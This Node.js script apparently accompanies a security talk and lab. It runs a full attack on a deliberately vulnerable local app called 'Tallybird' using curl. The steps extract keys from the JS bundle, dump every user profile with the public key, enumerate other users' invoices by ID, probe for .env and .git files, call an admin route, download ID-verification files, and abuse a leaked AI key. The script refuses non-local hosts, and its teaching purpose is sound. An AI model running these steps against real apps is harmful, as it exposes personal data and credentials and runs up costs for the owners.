#!/usr/bin/env node
// SPOILERS: this script runs the whole attack from the talk against your own
// local Tallybird, one real curl command at a time, and prints what comes back.
// Try the challenges in README.md by hand first.
//
//   npm start                 # in one terminal
//   npm run walkthrough       # in another
//
// Options: --app http://localhost:4747   where Tallybird runs (local only)
//          --json out.json               also save every command and response
// Needs bash and curl (macOS, Linux, or Git Bash / WSL on Windows).
import { execFileSync } from 'node:child_process';
import { readFileSync, writeFileSync, existsSync, mkdtempSync, rmSync } from 'node:fs';
import { join, dirname, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';

const args = process.argv.slice(2);
const opt = (name, fallback) => {
  const i = args.indexOf(name);
  return i >= 0 && args[i + 1] ? args[i + 1] : fallback;
};
const APP = opt('--app', 'http://localhost:4747');
const JSON_OUT = opt('--json', null) && resolve(opt('--json', null));
const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');

const host = new URL(APP).hostname;
if (!['localhost', '127.0.0.1', '::1', '[::1]'].includes(host)) {
  console.error(`Refusing to run against ${APP}. This walkthrough is for your own local Tallybird only.`);
  process.exit(1);
}

const env = { ...process.env, APP, KEY: '', TOKEN: '', AIKEY: process.env.AIKEY || '', FOLDER: process.env.FOLDER || '' };
// Commands run in a throwaway folder, so the file step 5 downloads never
// lands in (or overwrites anything in) the folder you started from.
const WORKDIR = mkdtempSync(join(tmpdir(), 'tallybird-walkthrough-'));
const steps = [];
const startedAt = new Date().toISOString();

function sh(command) {
  try {
    return execFileSync('bash', ['-c', command], { cwd: WORKDIR, env, encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 });
  } catch (err) {
    return err.stdout || '';
  }
}

// Split `curl -i` output into status, headers and body.
function parseHttp(raw) {
  const sep = raw.indexOf('\r\n\r\n');
  if (!raw.startsWith('HTTP/') || sep < 0) return { body: raw };
  const head = raw.slice(0, sep).split('\r\n');
  const headers = {};
  for (const line of head.slice(1)) {
    const i = line.indexOf(':');
    headers[line.slice(0, i).toLowerCase()] = line.slice(i + 1).trim();
  }
  return { status: Number(head[0].split(' ')[1]), statusLine: head[0], headers, body: raw.slice(sep + 4) };
}

function tryJson(text) {
  try {
    return JSON.parse(text);
  } catch {
    return undefined;
  }
}

function run(id, title, command, { http = false, show = (o) => o.body ?? o.raw } = {}) {
  const raw = sh(command);
  const out = http ? parseHttp(raw) : { body: raw };
  out.raw = raw;
  out.json = tryJson(out.body);
  steps.push({ id, title, command, ...out });
  console.log(`\n\x1b[33m# ${title}\x1b[0m\n$ ${command}`);
  if (out.statusLine) console.log(out.statusLine);
  const shown = String(show(out) ?? '');
  console.log(shown.length > 1200 ? `${shown.slice(0, 1200)}\n… (${shown.length} characters)` : shown);
  return out;
}

const pretty = (v) => JSON.stringify(v, null, 2);

// ---------- Step 1: read what you shipped ----------
const html = run('s1-html', 'Step 1. Find the JavaScript bundle the page loads', 'curl -s "$APP/" | grep -o \'/assets/index-[A-Za-z0-9_-]*\\.js\'');
const bundlePath = html.body.trim().split('\n')[0];
env.BUNDLE = bundlePath;
const keys = run('s1-keys', 'Step 1. Search the bundle for keys', 'curl -s "$APP$BUNDLE" | grep -oE \'eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+|demo_ai_key[A-Za-z0-9_]*\' | sort -u');
const found = keys.body.trim().split('\n').filter(Boolean);
env.KEY = found.find((k) => k.startsWith('eyJ')) || '';
env.AIKEY = found.find((k) => k.startsWith('demo_ai_key')) || env.AIKEY;

// Context around each key, the way a DevTools search shows it.
const bundleText = sh('curl -s "$APP$BUNDLE"');
const around = (needle, before = 70, after = 70) => {
  const i = bundleText.indexOf(needle);
  return i < 0 ? null : { before: bundleText.slice(Math.max(0, i - before), i), match: needle, after: bundleText.slice(i + needle.length, i + needle.length + after) };
};
const keyPayload = env.KEY ? JSON.parse(Buffer.from(env.KEY.split('.')[1], 'base64url').toString('utf8')) : null;
steps.push({
  id: 's1-context', title: 'Step 1. Where the keys sit in the bundle', command: null,
  bundle: { path: bundlePath, bytes: Buffer.byteLength(bundleText), anon: env.KEY ? around(env.KEY.slice(0, 36), 70, 10) : null, ai: env.AIKEY ? around(env.AIKEY) : null },
  json: keyPayload,
});
console.log('\n# Step 1. Decode the first key (it is a JWT)\n', pretty(keyPayload));

// ---------- Step 2: ask the database directly ----------
const dump = run('s2-dump', 'Step 2. Ask the database for every profile, with only the public key',
  'curl -s -i "$APP/rest/v1/profiles?select=*" -H "apikey: $KEY" -H "Authorization: Bearer $KEY" -H "Prefer: count=exact"',
  { http: true, show: (o) => `content-range: ${o.headers?.['content-range']}\n${Array.isArray(o.json) ? pretty(o.json.slice(0, 2)) : o.body}` });
if (Array.isArray(dump.json)) dump.json = { rows: dump.json.length, first: dump.json.slice(0, 3), sample_emails: dump.json.slice(3, 9).map((r) => r.email) };
dump.body = undefined;
dump.raw = undefined;
steps[steps.length - 1] = { ...steps[steps.length - 1], json: dump.json, body: undefined, raw: undefined };

// ---------- Step 3: change the number ----------
const signup = run('s3-signup', 'Step 3. Sign up like anyone would',
  'curl -s "$APP/auth/v1/signup" -H "apikey: $KEY" -H "Content-Type: application/json" -d \'{"email":"attacker@example.com","password":"correct-horse-battery"}\'',
  { show: (o) => (o.json ? pretty({ access_token: `${o.json.access_token?.slice(0, 24)}…`, user: { id: o.json.user?.id, email: o.json.user?.email } }) : o.body) });
env.TOKEN = signup.json?.access_token || '';
if (!env.TOKEN) {
  // Second run against the same server: the account exists, so log in instead.
  const login = run('s3-login', 'Step 3. The account already exists, so log in',
    'curl -s "$APP/auth/v1/token?grant_type=password" -H "apikey: $KEY" -H "Content-Type: application/json" -d \'{"email":"attacker@example.com","password":"correct-horse-battery"}\'',
    { show: (o) => (o.json?.access_token ? `access_token: ${o.json.access_token.slice(0, 24)}…` : o.body) });
  env.TOKEN = login.json?.access_token || '';
}
const mine = run('s3-mine', 'Step 3. My invoices', 'curl -s "$APP/api/invoices" -H "Authorization: Bearer $TOKEN"', { show: (o) => pretty(o.json) });
const myId = Array.isArray(mine.json) && mine.json[0] ? mine.json[0].id : 4212;
env.MINE = String(myId);
env.OTHER = String(myId - 1);
run('s3-other', 'Step 3. Change the number by one', 'curl -s "$APP/api/invoices/$OTHER" -H "Authorization: Bearer $TOKEN"', { show: (o) => pretty(o.json) });
env.FROM = String(myId - 20);
run('s3-loop', 'Step 3. Walk back twenty invoices',
  'for i in $(seq $FROM $OTHER); do curl -s -o /dev/null -w "%{http_code} " "$APP/api/invoices/$i" -H "Authorization: Bearer $TOKEN"; done; echo');

// ---------- Step 4: the doors the UI never shows ----------
run('s4-sweep', 'Step 4. Knock on the usual doors',
  'for p in .env .git/config backup.zip wp-login.php swagger.json admin api/admin api/docs; do curl -s -o /dev/null -w "%{http_code}  /$p\\n" "$APP/$p"; done');
run('s4-spec', 'Step 4. Read the API docs the app publishes', 'curl -s "$APP/api/openapi.json"', { show: (o) => pretty(Object.fromEntries(Object.entries(o.json?.paths || {}).map(([p, ops]) => [p, Object.values(ops).map((x) => x.summary + (x['x-internal'] ? ' [x-internal]' : ''))]))) });
run('s4-admin', 'Step 4. Call the admin route with a free account', 'curl -s "$APP/api/admin/users?limit=3" -H "Authorization: Bearer $TOKEN"', { show: (o) => pretty(o.json) });

// ---------- Step 5: open the files ----------
const list = run('s5-list', 'Step 5. List the ID bucket, with only the public key',
  'curl -s "$APP/storage/v1/object/list/id-verification" -H "apikey: $KEY" -H "Content-Type: application/json" -d \'{"prefix":"","limit":1000}\'',
  { show: (o) => (Array.isArray(o.json) ? `${pretty(o.json.slice(0, 3))}\n… ${o.json.length} folders` : o.body) });
if (Array.isArray(list.json)) {
  const last = steps[steps.length - 1];
  last.json = { folders: list.json.length, first: list.json.slice(0, 3) };
  last.body = undefined;
  last.raw = undefined;
  env.FOLDER = list.json[0]?.name || env.FOLDER;
}
run('s5-folder', 'Step 5. Look inside one folder',
  'curl -s "$APP/storage/v1/object/list/id-verification" -H "apikey: $KEY" -H "Content-Type: application/json" -d "{\\"prefix\\":\\"$FOLDER\\"}"', { show: (o) => pretty(o.json) });
run('s5-file', 'Step 5. Open the file, no key at all',
  'curl -s -o id-front.svg -w "%{http_code} %{content_type} %{size_download} bytes\\n" "$APP/storage/v1/object/public/id-verification/$FOLDER/id-front.svg"');
const svg = sh('curl -s "$APP/storage/v1/object/public/id-verification/$FOLDER/id-front.svg"');
steps[steps.length - 1].svg = svg.startsWith('<svg') ? svg : null;

// ---------- Bonus: spend their AI budget ----------
run('s6-ai', 'Bonus. Use the AI key from step 1 for something else',
  'curl -s -i "$APP/mock-ai/v1/chat/completions" -H "Authorization: Bearer $AIKEY" -H "Content-Type: application/json" -d \'{"model":"demo-model","messages":[{"role":"user","content":"Write a poem about invoices"}]}\'',
  { http: true, show: (o) => `x-demo-billed-to: ${o.headers?.['x-demo-billed-to'] ?? ''}\n${o.json ? pretty({ content: o.json.choices?.[0]?.message?.content, usage: o.json.usage, error: o.json.error }) : o.body}` });
run('s6-loop', 'Bonus. Five more calls, billed to Tallybird',
  'for i in 1 2 3 4 5; do curl -s -o /dev/null -w "%{http_code} " "$APP/mock-ai/v1/chat/completions" -H "Authorization: Bearer $AIKEY" -H "Content-Type: application/json" -d \'{"messages":[{"role":"user","content":"Write a poem about invoices"}]}\'; done; echo');

// ---------- What the app saw ----------
function readLog(name) {
  const file = join(ROOT, 'logs', name);
  if (!existsSync(file)) return [];
  return readFileSync(file, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)).filter((e) => e.time >= startedAt);
}
const accessLog = readLog('access.log');
const alerts = readLog('alerts.log');
console.log(`\n\x1b[33m# What Tallybird logged during this run\x1b[0m\n${accessLog.length} requests, ${alerts.length} alarms`);
for (const a of alerts) console.log(`  ALERT ${a.alert}: ${a.detail}`);

rmSync(WORKDIR, { recursive: true, force: true });

if (JSON_OUT) {
  writeFileSync(JSON_OUT, JSON.stringify({ app: APP, startedAt, finishedAt: new Date().toISOString(), steps, accessLog, alerts }, null, 2));
  console.log(`\nSaved ${steps.length} steps to ${JSON_OUT}`);
}
